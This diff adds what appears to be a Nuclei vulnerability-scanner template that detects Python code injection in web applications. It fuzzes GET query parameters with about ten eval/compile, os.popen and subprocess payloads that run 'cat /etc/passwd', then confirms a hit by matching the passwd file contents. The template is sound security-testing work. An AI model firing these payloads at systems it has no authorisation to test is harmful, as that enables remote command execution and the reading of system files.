@@ -1,0 +1,49 @@
+id: python-code-injection
+
+info:
+  name: Python Code Injection
+  author: ritikchaddha
+  severity: high
+  tags: python,dast,injection,cmdi
+
+variables:
+  Command: "cat /etc/passwd"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - eval(compile("""for x in range(1):\\n import os\\n os.popen(r'{{Command}}').read()""",'','single'))
+        # without loop, one expression
+        - eval(compile("""__import__('os').popen(r'{{Command}}').read()""",'','single'))
+        # without loop, one expression
+        - eval(compile("""__import__('subprocess').check_output(r'{{Command}}',shell=True)""",'','single'))
+        # without compile
+        - __import__('os').popen('{{Command}}').read()
+        # multiple expressions, separated by commas
+        - str("-"*50),__import__('os').popen('{{Command}}').read()
+        # multiple statements, separated by semicolons
+        - eval(compile("""__import__('os').popen(r'{{Command}}').read();import time;time.sleep(2)""",'','single'))
+        - eval(compile("""__import__('subprocess').check_output(r'{{Command}}',shell=True);import time;time.sleep(2)""",'','single'))
+        # with `for` loop technique, without global __import__ using subprocess.popen
+        - eval(compile("""for x in range(1):\n import os\n os.popen(r'{{Command}}').read()""",'','single'))
+        - eval(compile("""for x in range(1):\n import subprocess\n subprocess.Popen(r'{{Command}}',shell=True, stdout=subprocess.PIPE).stdout.read()""",'','single'))
+        - eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output(r'{{Command}}',shell=True)""",'','single'))
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+# digest: 490a00463044022064ced5a02135a5ba8b7c175805059e306f3733d3bbf857549147c9c0ccbd384002201c08821cca27e513e75cac1aac095d5b3a88042240da35c639097b520cc3e448:922c64590222798bb761d5b6d8e72950
